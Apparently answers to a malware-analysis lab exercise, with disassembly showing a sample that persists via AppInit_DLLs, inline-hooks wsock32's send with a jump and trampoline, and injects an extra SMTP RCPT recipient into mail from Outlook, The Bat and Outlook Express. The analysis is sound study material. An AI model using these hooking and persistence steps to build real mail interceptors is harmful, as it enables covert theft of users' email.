1. The malware exports a function called installer. It overwrites the key HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_Dlls
and copies an existing file called spoolvxx32.dll into the systems directory.

2&3. The malware assumes a configuration file called Lab11-02.ini to already exist in the systems directory. Note that CreateFile with dwCreationDisposition
equal to 3 will open existing file and return its handle.

.text:10001651 call    get_sys_directory
.text:10001656 mov     [ebp+Dest], eax
.text:10001659 push    104h            ; Count
.text:1000165E push    offset aLab1102Ini ; "\\Lab11-02.ini"
.text:10001663 mov     edx, [ebp+Dest]
.text:10001666 push    edx             ; Dest
.text:10001667 call    strncat
.text:1000166C add     esp, 0Ch
.text:1000166F push    0               ; hTemplateFile
.text:10001671 push    80h             ; dwFlagsAndAttributes
.text:10001676 push    3               ; dwCreationDisposition 
.text:10001678 push    0               ; lpSecurityAttributes
.text:1000167A push    1               ; dwShareMode  
.text:1000167C push    80000000h       ; dwDesiredAccess
.text:10001681 mov     eax, [ebp+Dest]
.text:10001684 push    eax             ; lpFileName
.text:10001685 call    ds:CreateFileA
.text:1000168B mov     [ebp+hFile], eax
.text:1000168E cmp     [ebp+hFile], 0FFFFFFFFh  <---- will fail right here because no permission to create file
.text:10001692 jz      short loc_10001

The config is contains an obfuscated email address: "billy@malwareanalysisbook.com".

4. As stated above, it is installed using the AppInit_Dlls key, which will automatically load a copy of the malware into any processes
that import User32.dll. 


The malware gets snapshot of the current process(CreateToolhelp32Snapshot), and loops through its current running threads (Thread32First) 
in order to locate the thread that has the same PID as returned from getCurrentProcessId. The thread is then suspended.

5. The malware uses inline hooking on the send function from winsock32.dll, replacing the first 5 bytes of the function with a jump to its
own code.

Module, function to be hooked, hook callback and some buffer address is passed to the get_hook_addr function
.text:10001561 E8 57 FE FF FF    call    suspend_curr_thread  
.text:10001566 68 84 34 00 10    push    offset dword_10003484 ; int
.text:1000156B 68 3D 11 00 10    push    offset hook     ; int
.text:10001570 68 C4 30 00 10    push    offset aSend    ; "send"
.text:10001575 68 CC 30 00 10    push    offset ModuleName ; "wsock32.dll"
.text:1000157A E8 24 FD FF FF    call    get_hook_addr

LoadLibraryA is called to load wsock32.dll
.text:100012BC 8B 4D 08          mov     ecx, [ebp+lpModuleName]
.text:100012BF 51                push    ecx             ; lpLibFileName
.text:100012C0 FF 15 4C 20 00 10 call    ds:LoadLibraryA
.text:100012C6 89 45 FC          mov     [ebp+hModule], eax

GetProcAddress used to get the address of send
.text:100012CF 8B 55 0C          mov     edx, [ebp+lpProcName]
.text:100012D2 52                push    edx             ; lpProcName
.text:100012D3 8B 45 FC          mov     eax, [ebp+hModule]
.text:100012D6 50                push    eax             ; hModule
.text:100012D7 FF 15 48 20 00 10 call    ds:GetProcAddress
.text:100012DD 89 45 F8          mov     [ebp+lpAddress], eax
.text:100012E0 83 7D F8 00       cmp     [ebp+lpAddress], 0
.text:100012E4 74 14             jz      short loc_100

The difference between the hook function and the addr of send is calculated, minus 5 bytes. This is going to be used 
by the jmp later. The 5 bytes is subtracted because that's the length of the jmp opcode plus the offset(4 bytes)
.text:10001209 8B 45 0C          mov     eax, [ebp+hook_addr] ; calculate offset to hook
.text:1000120C 2B 45 08          sub     eax, [ebp+send_addr]
.text:1000120F 83 E8 05          sub     eax, 5
.text:10001212 89 45 FC          mov     [ebp+offset_to_hook], eax

The jump opcode (E9) and offset to the hook function is written to the beginning of send.
.text:10001271 8B 55 08          mov     edx, [ebp+send_addr]
.text:10001274 C6 02 E9          mov     byte ptr [edx], 0E9h
.text:10001277 8B 45 08          mov     eax, [ebp+send_addr]
.text:1000127A 8B 4D FC          mov     ecx, [ebp+offset_to_hook]
.text:1000127D 89 48 01          mov     [eax+1], ecx

Next we will look at the trampoline code that will get executed by the hook function to transfer
control (trampoline) back to send. The first 5 bytes are copied into the buffer before they are
overwritten
.text:10001246 6A 05             push    5               ; Size
.text:10001248 8B 45 08          mov     eax, [ebp+send_addr]
.text:1000124B 50                push    eax             ; Src
.text:1000124C 8B 4D F8          mov     ecx, [ebp+var_8]  
.text:1000124F 83 C1 05          add     ecx, 5
.text:10001252 51                push    ecx             ; Dst
.text:10001253 E8 C2 04 00 00    call    memcpy 

The jmp opcode is placed at +0A in the allocated buffer, along with the jmp offset calculated by
subtracting send's address and the buffer address.
.text:1000125B 8B 55 F8          mov     edx, [ebp+var_8]
.text:1000125E C6 42 0A E9       mov     byte ptr [edx+0Ah], 0E9h ;jmp opcode
.text:10001262 8B 45 08          mov     eax, [ebp+send_addr]
.text:10001265 2B 45 F8          sub     eax, [ebp+var_8] 
.text:10001268 83 E8 0A          sub     eax, 0Ah
.text:1000126B 8B 4D F8          mov     ecx, [ebp+var_8]
.text:1000126E 89 41 0B          mov     [ecx+0Bh], eax  ;jmp offset

6. The hooked code looks for SMTP requests that contains the RCPT command, which essentially adds a recipient to current mail. 
The malware concatentates the address "billy@malwareanalysisbook.com" to the list of RCPT recipients, so that all mail being
sent out will be sent back to the malicious email address.

7. The malware attacks THEBAT.EXE, OUTLOOK.EXE and MSIMN.EXE because these processes are all email clients, and thus will
be sending out RCPT commands that can be injected with the malicious email address.

.text:100014F8                 push    offset aThebatExe ; "THEBAT.EXE"
.text:100014FD                 call    strlen
.text:10001502                 add     esp, 4
.text:10001505                 push    eax             ; Size
.text:10001506                 push    offset aThebatExe_0 ; "THEBAT.EXE"
.text:1000150B                 mov     eax, [ebp+Buf1]
.text:1000150E                 push    eax             ; Buf1
.text:1000150F                 call    memcmp



